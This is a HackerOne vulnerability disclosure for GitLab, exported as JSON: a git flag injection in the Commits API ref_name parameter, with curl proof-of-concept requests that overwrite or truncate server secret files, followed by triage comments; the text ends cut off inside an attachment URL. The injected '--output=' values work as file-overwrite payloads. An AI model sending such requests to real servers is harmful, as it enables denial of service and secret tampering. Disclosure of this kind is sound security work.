{"id":653125,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTMxMjU=","url":"https://hackerone.com/reports/653125","title":"Git flag injection leading to file overwrite and potential remote code execution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-07-22T16:00:17.809Z","submitted_at":"2019-07-22T16:00:17.809Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-19T00:24:21.076Z","bug_reporter_agreed_on_going_public_at":"2019-10-14T04:10:29.872Z","team_member_agreed_on_going_public_at":"2019-12-19T00:24:20.982Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\nThe `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.\n\nIf a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:\n\n`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`\n\nfollowed by\n\n`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`\n\nThis first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.\n\n### Steps to reproduce\n\n1. Create a repo and add a file\n2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:\n\n```\ncurl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.\u0026ref_name=--output=/tmp/written'\n```\n\n3. See that the file has been created:\n\n```\n# ls -asl /tmp/written\n0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written\n```\n\n### Impact\n\nThe bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.\n\nOne attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.\n\nThis method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:\n\n```\n# gitlab-ctl restart unicorn\nok: run: unicorn: (pid 46755) 1s\nroot@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret\n████████\n``\n\nThis then allows for use of the internal api:\n```\ncurl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'\n{\"api_version\":\"v4\",\"gitlab_version\":\"12.0.3\",\"gitlab_rev\":\"08a51a9db93\",\"redis\":true}\n\ncurl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███\u0026user_id=1'\n{\"id\":1,\"name\":\"Administrator\",\"username\":\"root\"}\n```\n\n### What is the current *bug* behavior?\n\nThe `ref_name` is not sanitized\n\n### What is the expected *correct* behavior?\n\nThe `ref_name` should be sanitized to prevent it being used as git command flags.\n\n#### Results of GitLab environment info\n\nSystem information\nSystem:\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.3p62\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.21.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.0.3\nRevision:\t08a51a9db93\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.7\nURL:\t\thttp://4290d4225642\nHTTP Clone URL:\thttp://4290d4225642/some-group/some-project.git\nSSH Clone URL:\tgit@4290d4225642:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t9.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n\n## Impact\n\nTruncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eThe \u003ccode\u003eref_name\u003c/code\u003e in the Commits API is not sanitized, allowing for a ref starting with \u003ccode\u003e--\u003c/code\u003e to be provided causing git to interpret it as a flag instead of as a ref.\u003c/p\u003e\n\n\u003cp\u003eIf a \u003ccode\u003eref_name\u003c/code\u003e such as \u003ccode\u003e--output=/tmp/some_file\u003c/code\u003e is used then the following command is executed by gitaly in \u003ccode\u003efind_commits.go\u003c/code\u003e:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003efollowed by\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis first writes the list of commits to the file, but then the \u003ccode\u003erev-list\u003c/code\u003e command fails but not before truncating the file.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a repo and add a file\u003c/li\u003e\n\u003cli\u003eUse the commit api and pass in a \u003ccode\u003eref_name\u003c/code\u003e such as \u003ccode\u003e--output=/tmp/written\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;http://4290d4225642/api/v4/projects/5/repository/commits?path=.\u0026amp;ref_name=--output=/tmp/written\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eSee that the file has been created:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# ls -asl /tmp/written\n0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"impact\"\u003eImpact\u003c/h3\u003e\n\n\u003cp\u003eThe bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.\u003c/p\u003e\n\n\u003cp\u003eOne attack scenario I thought of would be to truncate \u003ccode\u003e/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret\u003c/code\u003e, which almost worked but ended up failing due to \u003ccode\u003eauthenticate_by_gitlab_shell_token\u003c/code\u003e checking the token with \u003ccode\u003eunauthorized! unless Devise.secure_compare(secret_token, input)\u003c/code\u003e which fails if either are blank.\u003c/p\u003e\n\n\u003cp\u003eThis method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a \u003ccode\u003egit log\u003c/code\u003e happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# gitlab-ctl restart unicorn\nok: run: unicorn: (pid 46755) 1s\nroot@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret\n████████\n``\n\nThis then allows for use of the internal api:\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ecurl -s \u0026#39;\u003ca title=\"http://4290d4225642/api/v4/internal/check?secret_token=%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88\" href=\"/redirect?url=http%3A%2F%2F4290d4225642%2Fapi%2Fv4%2Finternal%2Fcheck%3Fsecret_token%3D%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://4290d4225642/api/v4/internal/check?secret_token=%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;\u003cbr\u003e\n{\u0026quot;api_version\u0026quot;:\u0026quot;v4\u0026quot;,\u0026quot;gitlab_version\u0026quot;:\u0026quot;12.0.3\u0026quot;,\u0026quot;gitlab_rev\u0026quot;:\u0026quot;08a51a9db93\u0026quot;,\u0026quot;redis\u0026quot;:true}\u003c/p\u003e\n\n\u003cp\u003ecurl -s \u0026#39;\u003ca title=\"http://4290d4225642/api/v4/internal/discover?secret_token=%E2%96%88%E2%96%88%E2%96%88\u0026amp;user_id=1\" href=\"/redirect?url=http%3A%2F%2F4290d4225642%2Fapi%2Fv4%2Finternal%2Fdiscover%3Fsecret_token%3D%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%26user_id%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://4290d4225642/api/v4/internal/discover?secret_token=%E2%96%88%E2%96%88%E2%96%88\u0026amp;user_id=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;\u003cbr\u003e\n{\u0026quot;id\u0026quot;:1,\u0026quot;name\u0026quot;:\u0026quot;Administrator\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;root\u0026quot;}\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\n### What is the current *bug* behavior?\n\nThe `ref_name` is not sanitized\n\n### What is the expected *correct* behavior?\n\nThe `ref_name` should be sanitized to prevent it being used as git command flags.\n\n#### Results of GitLab environment info\n\nSystem information\nSystem:\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.3p62\nGem Version:    2.7.9\nBundler Version:1.17.3\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.21.0\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab information\nVersion:    12.0.3\nRevision:   08a51a9db93\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.7\nURL:        http://4290d4225642\nHTTP Clone URL: http://4290d4225642/some-group/some-project.git\nSSH Clone URL:  git@4290d4225642:some-group/some-project.git\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    9.3.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n\n## Impact\n\nTruncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"3500.0","formatted_bounty":"$3,500","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":164,"voters":["sky003","sultancad","spam404","base_64","cinzinga","sameerphad72","stealthy","fatal7error","mygf","tungpun","and 154 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5389155,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 20 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-07-22T16:20:23.802Z","updated_at":"2019-07-22T16:20:23.802Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5390360,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report @vakzz! We are triaging this as a high severity issue for now. We will escalate if we are able to find a way to turn it into RCE. \n\nIn addition to DoS, this vulnerability would allow an attacker to erase log files and other repositories' data.","markdown_message":"\u003cp\u003eThank you for your report \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e! We are triaging this as a high severity issue for now. We will escalate if we are able to find a way to turn it into RCE. \u003c/p\u003e\n\n\u003cp\u003eIn addition to DoS, this vulnerability would allow an attacker to erase log files and other repositories\u0026#39; data.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-22T19:16:23.317Z","updated_at":"2019-07-22T19:16:23.317Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5390361,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-22T19:16:31.380Z","updated_at":"2019-07-22T19:16:31.380Z","additional_data":{"old_severity":"Critical","new_severity":"High","old_severity_id":469815,"new_severity_id":469937},"actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5390420,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitaly/issues/1799.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitaly/issues/1799\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitaly%2Fissues%2F1799\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitaly/issues/1799\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-22T19:25:33.639Z","updated_at":"2019-07-22T19:25:33.639Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5395879,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThanks for the quick triage.\n\nA small update, if you run the following call twice then the `rev-list` command doesn't happen the second time allowing for the file to be overwritten with a known sha1 hash:\n\n```\ncurl 'http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'\n\n# cat /var/opt/gitlab/gitlab-pages/admin.secret\n██████\n```\n\n{F535597}\n\nThis allows for `gitlab_pages_secret` and `gitlab_shell_secret` to be overwritten with known values.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThanks for the quick triage.\u003c/p\u003e\n\n\u003cp\u003eA small update, if you run the following call twice then the \u003ccode\u003erev-list\u003c/code\u003e command doesn\u0026#39;t happen the second time allowing for the file to be overwritten with a known sha1 hash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret\u0026#39;\n\n# cat /var/opt/gitlab/gitlab-pages/admin.secret\n██████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"commit.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/535/597/c4e4766608ca79d279ac43706491edfa6f43e85d/commit.png?response-content-disposition=attachment%3B%20filename%3D%22commit.png%22%3B%20filename%2A%3DUTF-8%27%27commit.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063357Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=2ef30a499edb7750834e5c9a53f35afb14328c9f9d36d635cc2f530ec60f0b43\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/535/597/c4e4766608ca79d279ac43706491edfa6f43e85d/commit.png?response-content-disposition=attachment%3B%20filename%3D%22commit.png%22%3B%20filename%2A%3DUTF-8%27%27commit.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063357Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2BALvzzN5PLj4E9A%2Bwmv%2FwIgM8BdxFsm0wGfnWsssx3X6cDoUNw7ldQ%3D%3D\u0026amp;X-Amz-Signature=2ef30a499edb7750834e5c9a53f35afb14328c9f9d36d635cc2f530ec60f0b43\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis allows for \u003ccode\u003egitlab_pages_secret\u003c/code\u003e and \u003ccode\u003egitlab_shell_secret\u003c/code\u003e to be overwritten with known values.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-23T04:38:24.256Z","updated_at":"2019-12-19T00:23:07.313Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":535597,"filename":"commit.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/535/597/c4e4766608ca79d279ac43706491edfa6f43e85d/commit.png?response-content-disposition=attachment%3B%20filename%3D%22commit.png%22%3B%20filename%2A%3DUTF-8%27%27commit.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPKTSU4A%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063357Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICR3Wbqr3QmaXXF3DerXHfL2hl5mL6uGPxa9bL7HxbeqAiEAqWiWv4fNm1cBuTJbNOPDhjMWyvgVYBMfeqSvL3C%2Br5kqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDLWeuL88FcgTd%2BHDFiqRA7sDjduiUr7yrR1bP0fy3jpTtTXARM3Gr8rkIOStwiuzOpvS67rApjBlyTcg901MzVj81BMqg2D%2FoYR3%2FSoNuwT33h6KUwD255ES%2FPaggNJ05ASpUwzUlVyePLw4P7in3wPJpZgw9N8dZGDgg6RxPAgdRMTCMAdlbL23s9IEA0HQY%2FGrR4AsNah2Xjle%2Beki0NqkG2PIPu3eRj3%2BQqZznd3OfS%2F2sVbcGOtcKdRNfVO%2Bms3UlWm2aPpwFiBKtt5yY1oKJr%2BgD%2BF%2FSQXzNSV67TxIzKIjNEaMGEHoDWRX0O4KOc6rsER7d7YcxMm3LHCy5VXT6QRFyFg%2FG4p8jairmeusKiaAs0jSa4nN2Zw3%2BCVW97Ila6RUU7muvv0d6W%2FYI6MJm443s6INDwS%2F0HX%2Bw8e4TOsebeohnSpFhM2ci9Q8tz6Q72ZmyHoSODXtdcyWxmKZOiWjWtpBmasfdIsQkZzxOUEp9TeB9Eaq72Q8%2BcHbJ%2Fn4cBcE%2FhCkABtaY7%2BW80JUqsSXPlI8vt2z0j%2B7EAZZMJT4qv8FOusB53xj88px4LwwmmUwc4%2B73P1hcJQ5adArgpVyBc%2Fvo2mvPbSXp8aV8B1%2BrfMDWuQn5Unmirx7fguBekXWHMyBRZ5m12xEhEj3mDnu3koQSeJRnoNQdEu1tOplrrLMENBFS6mTQ%2BUUBq1sggQqNoyyQNPVrpOTENkW7e%2FKnl%2FHjjMD5ktvCe3RQAaSXnShU%2FFfKQH%2FQlegKj92VkKfFBzGzGJ0gmEIyc6Fl56gBo43TML6rbL9j9QyU%2FpQpXJOVD4OV4s4%2